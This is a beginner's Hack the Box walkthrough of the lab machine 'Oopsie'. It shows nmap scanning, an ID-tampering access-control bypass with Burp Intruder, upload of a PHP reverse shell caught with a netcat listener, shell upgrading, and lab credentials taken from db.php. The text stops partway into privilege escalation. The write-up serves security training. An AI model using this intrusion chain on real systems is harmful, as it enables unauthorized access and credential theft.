# Hack the Box: Oopsie

# Enumeration 

Step 1: Nmap Scan

  - First we are going to run a nmap scan
    -       sudo nmap -sS -A 10.10.10.28

![image](https://user-images.githubusercontent.com/29686845/132744067-062cdd8e-440a-4a93-955c-a93a49bf5db0.png)

  - Looking at the scan we can see that port 22 ssh and port 80 http are open. 
    - Port 22 SSH: Is a networ protocol that allows a secure connection to a computer or server. 
      - Check out the link below if you wan to learn more
      - https://searchsecurity.techtarget.com/definition/Secure-Shell
    - Port 80 http: http is an application level protocl that allows communication between web browsers and web servers.       This port is using apache one of the worlds most popular web server software.
      - If you would like to read more about http and apache check out the links below!
      - https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview
      - https://httpd.apache.org/
     
Step 2: Open Ports
  - First we will look at port 22
    - This will lead nowhere, but for the sake of realism we will go through the steps. If you would like to jump ahead         feel free to do so. 
    - We will try to connect to ssh with the user and administrator credentials we have gathered from the previous box         archetype.  
    -     ssh ARCHETYPE/sql-svc@10.10.10.28
    -     ssh administrator@10.10.10.28
    - As you can see in the screen shots below we have been denied access

      ![image](https://user-images.githubusercontent.com/29686845/132754134-8397a004-482f-4dd5-a56f-ba76c495c538.png)

      ![image](https://user-images.githubusercontent.com/29686845/132754201-8f167c3e-0167-4436-a468-010bd8470afd.png)

  - Now lets take a look at Port 80
    - We will do this by opening a web browser and typing the IP Address of the machine into the url bar
    -     http://10.10.10.28
    - At first glance there seems to be nothing of value on the web page, but after reading through it we notice               something important under services. It references a customer login.
      
      ![image](https://user-images.githubusercontent.com/29686845/132760926-860112b0-c9ad-4d96-972c-c29457782e18.png)

  - Next we will us burp suit to look furhter into the backend of the webpage. First I am going to show you how to set up     the proxy burp suite will need (If you have not already) in the next step. 

Step 3: Burp Suite
  - First if you want to learn about Burpsuite check out their webpage https://portswigger.net/burp
  - To start we will need to set up the foxy proxy standard extenision within you firefox browser.
    - To do this we click on the three lines on the top left of your browser, click on add ons, search for "foxy proxy",       click into foxy proxy standard, and click add to firefox. 
  - Open burp suite and create a temporary new project. 
  - Once you are into burp you will need to configure your proxy to run through foxy proxy.
    - Start by going to the proxy tab in burpsuite, click options in the subtab, and look at your Proxy Listeners.
      ![image](https://user-images.githubusercontent.com/29686845/132773770-95494d79-9325-45a3-94ac-3b3806ba7da3.png)
    - Take note of the Interface IP that is listed it should look like the one in the snapshot above. 
    - Now go to your foxy proxy icon on firefox and open it by clicking the icon, click options and configure foxy proxy       with the interface ip and port number that was in burpsuite.
      ![image](https://user-images.githubusercontent.com/29686845/132774125-3767037e-b934-49e8-aec3-17050de88ee4.png)
    - Lastly click save.
  - Now that we have everything configured. We are going to use Burp to intercept, change, and modify packets that are       going from the web page to the web server and see what we can access.
    - click on you foxy proxy icon and click on your new proxy and refresh the page.
    - You will see that in burp suite the proxy tab and the intercept subtab both turned orange. If we look into               intercept we will see the packet that was just sent to refresh the page. 
      ![image](https://user-images.githubusercontent.com/29686845/132775431-0bced0eb-1f7b-4190-9077-20a58d6b8161.png)
    - You may notice that the webpage is loading and not doing anything. Since we intercepted the package sent from the         website it is waiting for us to forward the packet. 
    - Now lets click on the target tab and look into the subtab Site Map
      ![image](https://user-images.githubusercontent.com/29686845/132776295-3384f904-6f9c-428a-be76-e89d22d3a205.png)
    - After looking through the files we can see the login path
    - Lets add that to our URL and see what happens. 
      ![image](https://user-images.githubusercontent.com/29686845/132776412-3e61c2d7-b1e4-412a-8d0c-8bb7a857f824.png)
    - Lets try the credentials that we learned from the previous machine. I tried both users and it do not work. 
    - After some guess work I was able to find the Username and Password. 
      - Username: Admin
      - Password: MEGACORP_4dm1n!!
    - As you will see below we got access to the Admin Panel of the website.
      ![image](https://user-images.githubusercontent.com/29686845/132804696-f989a29c-c914-4c48-aa1a-ef471ace2984.png)
    - After exploiring the webpage. we will notice something that should catch our attention in the uploads page. 
      ![image](https://user-images.githubusercontent.com/29686845/132966320-43c4b9b2-e0f8-4b45-8523-9e122cb40938.png)
    - We can see that that there is another user account: Super Admin with higher privilges that can upload files onto         the web server. 
    - Intercepting packets with burp we will notice something else interesting. when going to the accounts tab we can see       a get request the provides an id number as seen below
      ![image](https://user-images.githubusercontent.com/29686845/132966475-9d734ce7-86e5-4e02-a731-50feda6a33b1.png)
    - We will want to see if we can manipulate the value and gather enough information to get the user id of the super         admin account. We can do this with burp suites intruder mode. 
    - Press CTL + i on the packet we collected. (You will see the Intruder tab light up orange.)
    - Click on the intruder tab, make sure the subtab Target has the correct IP that we are attackin. In this case it wil       be 10.10.10.28. 
      ![image](https://user-images.githubusercontent.com/29686845/132967868-4922006e-bf25-4ef9-9e34-9510763353c5.png)
    - Click on the sub tab positions. We will see multiple selections highlighted as seen below. 
      ![image](https://user-images.githubusercontent.com/29686845/132967911-6898ddb6-e97b-48b9-b1ef-c236c685c70b.png)
    - We are only interested in the id number so lets clear the selected items with the clear tab on the right hand side       of burpsuite. 
    - highlight the id number (1) and click add.
      ![image](https://user-images.githubusercontent.com/29686845/132967985-009bb8ae-a407-48cf-b4ea-afee83f8095a.png)
    - Click the Payloads tab.
    - Now we are going to create and use a simple for loop to simplify our payload
    -     for i in `seq 1 100`; do echo $i; done
      - If you are unframiliar with scripting There are many schools of though on what programming language you should           use. I started with python and I highly recommend this book "Python Crash Course 2nd Edition..." by Eric Matthes
      - In this case we saying for i (the variable) in the sequence 1 to 100 (the condition) do echo (echo is a command           to print to the screen) $i (The $ is a wildcard) i (The variable). (That was my best attempt to expain it for             you! I am still learning myself -.-)
    - Paste the for loop into your terminal and run the command. Copy the output and past it into the list as seen below.
    
      ![image](https://user-images.githubusercontent.com/29686845/132969575-838ade83-ff1c-43b4-9d4b-e4b464b0ffb6.png)
    - Lastly click the subtab options and at the bottom make sure the section "Rediretions" says always adnd "Process             cookies in redirections" is checked
      ![image](https://user-images.githubusercontent.com/29686845/132969711-a019e061-b0b9-4ce5-9875-27feb657e8af.png)
    - Once we have everything done click the funnest button that is here.... "Start Attack". 
    - This may take some time to complete so now seems like a good time to take a break!
    - Now that we are back. our attack should be finished. and you should a see an output like the one below. 
      ![image](https://user-images.githubusercontent.com/29686845/132971070-85395582-33bf-4d86-97c3-80c0b3836bc8.png)
    - We want to click on one of the requests and read through the response sections of it or I like to use the search         feature.
    - I know we are looking for the user/role super admin so lets search for that and work a way through the packts. 
      ![image](https://user-images.githubusercontent.com/29686845/132971130-a00be38c-9a4a-4cbb-b9ad-cb859f86e2ea.png)
    - We see some helpful information such as a 5 digit number the user super admin and an email address. 
      - User #: 86575
      - Role: super admin
      - Email: superadmin@megacorp.com
    - Now that we have the super admin user's number lets go back to the uploads page, capture the packet being sent, and       modify the user number in the packet and lets see what happens. 
      ![image](https://user-images.githubusercontent.com/29686845/132971308-b65dfa48-726f-4c80-b6f3-a35664039f9d.png)
    - Success we are in! 
      ![image](https://user-images.githubusercontent.com/29686845/132971331-a7a6036d-e25e-40c9-9d5f-67bdb4110383.png)
  - Okay that was a long section with a lot of information! I am happy to say we made it this far and we should be proud     of our progress!!!

# FootHold
  - Now we are going to focus on gaining a foot hold into thier network and possible gain a persistant connection on         their machine. 
  - 
Step 1: Testing Input Validation

  - To do this we are going to test to if the developer of their webage left anything out. Since we are trying to           upload a file we can see if they forgot or ignored to add user input validiation to their web server/web page. 
    -  Check out this link if you want to learn more about input validation
       https://www.whitehatsec.com/glossary/content/input-validation
       
Step 2: Uploading a reverse shell

  - We are going to try to upload a php reverse shell.
    - Kali Linux already has a php reverse Shell that we can use in /usr/share/webshells/php/php-reverse-shell.ph
      - Make sure that before you upload the reverse shell you update the IP address and the port number with nano.
      - to check you IP address run ifconfig
      - Change the port to what ever is not in use normally we can use port 4444
    - lets click the browse tab and go through the directorise in the GUI (I know YUCKK!) and upload the reverse shell
    - Once uploaded intercept the packet with burp suite and change the user number as we did before to the super user         number as seen below. 
      ![image](https://user-images.githubusercontent.com/29686845/133001076-a213148f-b1d7-4ddb-a525-56ee140b8d37.png)
      ![image](https://user-images.githubusercontent.com/29686845/133001094-8b15c08f-bced-4046-91f2-d35c023c7a03.png)
    - Success we were able to upload the php file.

Step 3: finding and using our reverse shell. 

  - We now have our reverse shell uploaded we need to figure out where it is and how we can access it.
    - Luckily for us we can use the tool dirsearch. to do this run the following commands. 
      - To get dirsearch run the follwowing command.
      -       git clone https://github.com/maurosoria/dirsearch.git
      - cd to the directory you put git clone in. (I am moving everything into opt) 
    - once we are there we are going to run our dirsearch.py with the commmand below.
    -       sudo python3 dirsearch.py -u http://10.10.10.28 -e php
    - After running this command we will see the output showing all directories within the ip 10.10.10.28
      ![image](https://user-images.githubusercontent.com/29686845/133331077-d8c817fc-6695-4da9-88d3-43eb750346f5.png)
    - This shows us an upload directory. (This is probably the directory where we uploaded our reverse shell file)
  - Now that we have found what directory that our file is in lets see if we can activate our reverse shell that we         have previously updated. 

Step 4: Calling our Reverse shell.

  - First we want to set up a listner using netcat in one terminal
    -     nc -lvnp 4444
  - In another teminal we want to call on our reverse shell using the curl command.
    -     curl http://10.10.10.28/uploads/php-reverse-shell.php
      - if you nammed your file anything else use the name of the file you uploaded at the end of the path
  - Once ran we obtain a www-data shell, but we still have to upgrade it!
    ![image](https://user-images.githubusercontent.com/29686845/133340021-920411b8-e932-47c8-9598-b0dab56c3cb8.png)
    
Step 5: Upgrading our Shell
  - Now that we have a shell we are going to to enter the following commands to upgrade it
    -     SHELL=/bin/bash script -q /dev/null
      ![image](https://user-images.githubusercontent.com/29686845/133341758-5811fa16-b6e0-429d-83b9-a2a9c313cb53.png)
      - There is another walkthrough that will tell you to type in more commands from there, but it does not work. I           have tried many other ways and it always breaks the shell. so lets do this instead. 
    - once we run the above command we get a command line that we are more framiliar too with the user@machine.
      ![image](https://user-images.githubusercontent.com/29686845/133342381-80d0d165-e48c-4b6d-ac9f-e0babb9b08a1.png)
    - We now have an upgraded shell!

# Lateral Movement

Step 1: finding the database
  - type pwd (print working directory) and we can see that we are in the root directory. 
  - knowing we are looking for the web page database we have to find it and there are multiple ways to this
    -  If you are framiliar with linux file system you will know that it is in /var/www/html
    -  if you are not you can take the time to search through everything.
  - Since I know the name of the file I am going to use the locate command. 
    -     locate db.php
       ![image](https://user-images.githubusercontent.com/29686845/133343786-f955bbca-9188-403e-bf3b-ace8e3d3b747.png)
  - Now we can see that it is located at /var/www/html/cdn-cgi/login/
Step 2: Read the Database
  - We will use the command cat to read the file. 
    -     cat db.php
    ![image](https://user-images.githubusercontent.com/29686845/133344237-3c5c3c81-cd33-442f-b99e-a9cf0bb810a0.png)
  - We see that there is another user account located in the DataBase
    - Uesrname: Robert
    - Password: M3g4C0rpUs3r!

# Prvilege Escallation

Step 1: robert
  - We should run the command id to see what permissions and groups robert has accesss to.
    ![image](https://user-images.githubusercontent.com/29686845/133344841-4ae3e016-05ca-4eb8-b160-c4a8669f96aa.png)
  - We can see he is apart of the group "bugtracker". So lets find it.
    - We can use the find command to see if there is anything related and where it is to bugtracker.
    -       find -type f - group bugtracker 2>/dev/null
